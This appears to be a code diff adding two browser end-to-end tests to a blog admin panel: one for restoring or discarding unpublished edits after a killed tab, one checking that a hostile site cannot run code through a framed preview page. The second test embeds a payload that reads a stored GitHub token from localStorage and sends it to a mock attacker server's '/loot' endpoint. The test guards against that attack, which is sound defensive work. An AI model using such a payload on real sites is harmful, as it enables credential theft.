@@ -17,6 +17,7 @@
 import { createRequire } from 'node:module';
 import assert from 'node:assert/strict';
 import fs from 'node:fs';
+import http from 'node:http';
 import os from 'node:os';
 import path from 'node:path';
 import { startMock, buildSite, openAdmin, REPO_ROOT } from './mock-github.mjs';
@@ -445,6 +446,138 @@ try {
     await mp.evaluate(() => window.scrollTo(0, 0));
     await mp.screenshot({ path: path.join(SHOTS, 'mobile-360.png') });
     await mctx.close();
+  });
+
+  await step('unpublished changes survive a killed tab (no beforeunload): 恢复 / 丢弃 banner', async () => {
+    const lctx = await browser.newContext({ viewport: { width: 1280, height: 800 }, colorScheme: 'light' });
+    try {
+      const p1 = await lctx.newPage();
+      p1.on('pageerror', (e) => pageErrors.push(`local: ${e.message}`));
+      await openAdmin(p1, mock, { path: '/admin/#/background' });
+      await waitView(p1, 'background');
+      assert.equal(await p1.$$eval(tid('bg-local-draft'), (e) => e.length), 0, 'no banner without a saved draft');
+      const publishedStars = await (async () => {
+        await p1.click(tid('bg-card-three-body'));
+        return p1.inputValue(tid('bg-param-STAR_COUNT'));
+      })();
+      const stars = String(Number(publishedStars) + 1);
+      await p1.fill(tid('bg-param-STAR_COUNT'), stars);
+      const wasNone = await p1.getAttribute(tid('bg-autoplay-none'), 'aria-checked');
+      const target = wasNone === 'true' ? 'home' : 'none';
+      await p1.click(tid(`bg-autoplay-${target}`));
+      assert.equal(await p1.isDisabled(tid('bg-save')), false);
+      const commitsBefore = mock.commits.length;
+      // iOS closing the tab / the system killing a background tab: no beforeunload, nothing else runs
+      await p1.close({ runBeforeUnload: false });
+
+      const p2 = await lctx.newPage();
+      p2.on('pageerror', (e) => pageErrors.push(`local: ${e.message}`));
+      await openAdmin(p2, mock, { path: '/admin/#/background' });
+      await waitView(p2, 'background');
+      await p2.waitForSelector(tid('bg-local-draft'));
+      assert.match(await p2.textContent(tid('bg-local-draft')), /发现本机未发布的背景动画修改/);
+      assert.equal(await p2.isDisabled(tid('bg-save')), true, 'nothing applied before the user chooses');
+      await p2.click(tid('bg-local-restore'));
+      await p2.waitForSelector(tid('bg-local-draft'), { state: 'detached' });
+      assert.equal(await p2.getAttribute(tid(`bg-autoplay-${target}`), 'aria-checked'), 'true', 'autoplay choice restored');
+      assert.equal(await p2.inputValue(tid('bg-param-STAR_COUNT')), stars, 'tuned parameter restored');
+      assert.equal(await p2.isDisabled(tid('bg-save')), false);
+      assert.match(await p2.textContent(tid('bg-save-hint')), /有 2 项修改未发布/);
+      assert.equal(mock.commits.length, commitsBefore, 'restoring never publishes');
+      await p2.close({ runBeforeUnload: false });
+
+      // 丢弃 → gone for good
+      const p3 = await lctx.newPage();
+      await openAdmin(p3, mock, { path: '/admin/#/background' });
+      await waitView(p3, 'background');
+      await p3.waitForSelector(tid('bg-local-draft'));
+      await p3.click(tid('bg-local-discard'));
+      await p3.click(tid('confirm-ok'));
+      await p3.waitForSelector(tid('bg-local-draft'), { state: 'detached' });
+      assert.equal(await p3.isDisabled(tid('bg-save')), true);
+      await p3.reload();
+      await waitView(p3, 'background');
+      await sleep(300);
+      assert.equal(await p3.$$eval(tid('bg-local-draft'), (e) => e.length), 0, 'discarded draft does not come back');
+
+      // a confirmed 「仍然离开」 also forgets it; a clean state stores nothing
+      await p3.click(tid('bg-card-three-body'));
+      await p3.fill(tid('bg-param-STAR_COUNT'), stars);
+      assert.ok(await p3.evaluate(() => localStorage.getItem('admin.bg.unpublished')), 'edit stored locally right away');
+      await p3.click(tid('nav-posts'));
+      await p3.click(tid('confirm-ok'));
+      await waitView(p3, 'posts');
+      assert.equal(await p3.evaluate(() => localStorage.getItem('admin.bg.unpublished')), null);
+      assert.equal(mock.commits.length, commitsBefore);
+      await p3.close({ runBeforeUnload: false });
+    } finally {
+      await lctx.close();
+    }
+  });
+
+  await step('security: another website cannot run code through cassette-frame.html (token stays private)', async () => {
+    // GitHub Pages sends no X-Frame-Options, so any site can frame /admin/cassette-frame.html. The frame must
+    // refuse to run posted code unless it is inside the admin's own sandbox (origin "null", parent = admin).
+    const SECRET = 'github_pat_E2E_BG_SECRET_TOKEN';
+    const victim = new URL(mock.url).origin;              // http://127.0.0.1:<port>
+    const frameUrl = `${victim}/admin/cassette-frame.html`;
+    const loot = [];
+    const attackerHtml = `<!doctype html><meta charset="utf-8"><title>attacker</title>
+      <iframe id="plain" src="${frameUrl}"></iframe>
+      <iframe id="sbx" sandbox="allow-scripts" src="${frameUrl}"></iframe>
+      <iframe id="sbxso" sandbox="allow-scripts allow-same-origin" src="${frameUrl}"></iframe>
+      <script>
+        window.got = [];
+        addEventListener('message', (ev) => { window.got.push({ from: ev.source && ev.source.frameElement ? ev.source.frameElement.id : '?', data: ev.data }); });
+        const payload = "window.__pwned = 1; var t = null; try { t = localStorage.getItem('admin.token'); } catch (e) { t = 'ERR'; }" +
+          "try { parent.postMessage({ type: 'pwned', token: t }, '*'); } catch (e) {}" +
+          "try { fetch(" + JSON.stringify(location.origin + '/loot') + " + '?t=' + encodeURIComponent(String(t)), { mode: 'no-cors' }); } catch (e) {}";
+        function fire() {
+          for (const f of document.querySelectorAll('iframe')) {
+            try { f.contentWindow.postMessage({ type: 'run', code: payload, dark: false }, '*'); } catch (e) {}
+          }
+        }
+        window.fire = fire;
+      </script>`;
+    const atk = http.createServer((req, res) => {
+      if (req.url.startsWith('/loot')) { loot.push(req.url); res.end('ok'); return; }
+      res.writeHead(200, { 'content-type': 'text/html; charset=utf-8' });
+      res.end(attackerHtml);
+    });
+    await new Promise((r) => atk.listen(0, '127.0.0.1', r));
+    const attacker = `http://localhost:${atk.address().port}`;   // a different site than 127.0.0.1
+    const actx = await browser.newContext();
+    try {
+      // the victim has a remembered token on the admin's origin
+      const vp = await actx.newPage();
+      await vp.goto(frameUrl);
+      await vp.evaluate((t) => localStorage.setItem('admin.token', t), SECRET);
+      assert.equal(await vp.evaluate(() => localStorage.getItem('admin.token')), SECRET);
+      await vp.close();
+
+      const ap = await actx.newPage();
+      await ap.goto(attacker + '/', { waitUntil: 'load' });   // 'load' waits for the iframes too
+      await sleep(300);
+      // the three frames really loaded the cassette page (so a refusal below is the guard, not a load failure)
+      const framed = ap.frames().filter((f) => f.url() === frameUrl);
+      assert.equal(framed.length, 3, 'attacker page framed cassette-frame.html three times');
+      for (const f of framed) assert.equal(await f.evaluate(() => document.title), '背景动画预览');
+      for (let i = 0; i < 5; i++) { await ap.evaluate(() => window.fire()); await sleep(200); }
+      await sleep(800);
+      for (const f of framed) {
+        const r = await f.evaluate(() => ({ pwned: window.__pwned === 1, scripts: document.scripts.length, origin: self.origin }));
+        assert.equal(r.pwned, false, `posted code must not run in a frame with origin ${r.origin}`);
+        assert.equal(r.scripts, 1, `no script was injected (origin ${r.origin})`);
+      }
+      const got = await ap.evaluate(() => window.got);
+      assert.deepEqual(got.filter((g) => g.data && g.data.type === 'pwned'), [], 'no code ran');
+      assert.deepEqual(got.filter((g) => g.data && ['ready', 'started', 'stats'].includes(g.data.type)), [], 'the frame does not talk to a foreign parent');
+      assert.deepEqual(loot, [], 'the token never reached the attacker');
+      await ap.close();
+    } finally {
+      await actx.close();
+      await new Promise((r) => atk.close(r));
+    }
   });
 
   await step('no page errors', async () => {
